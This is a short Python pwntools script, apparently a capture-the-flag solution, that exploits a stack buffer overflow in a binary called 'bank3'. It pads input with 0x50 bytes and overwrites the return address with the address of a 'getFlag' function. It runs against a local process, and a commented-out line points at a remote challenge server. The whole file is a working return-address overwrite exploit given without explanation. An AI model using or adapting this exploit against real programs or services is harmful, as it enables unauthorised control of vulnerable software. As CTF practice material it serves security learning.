from pwn import *

binary = context.binary = ELF('./bank3')

#p = remote('61.28.237.24','30204')
p = process('./bank3')

payload = b'A'*(0x4c+0x4)
payload += p32(binary.sym.getFlag)
p.sendline(payload)

p.interactive()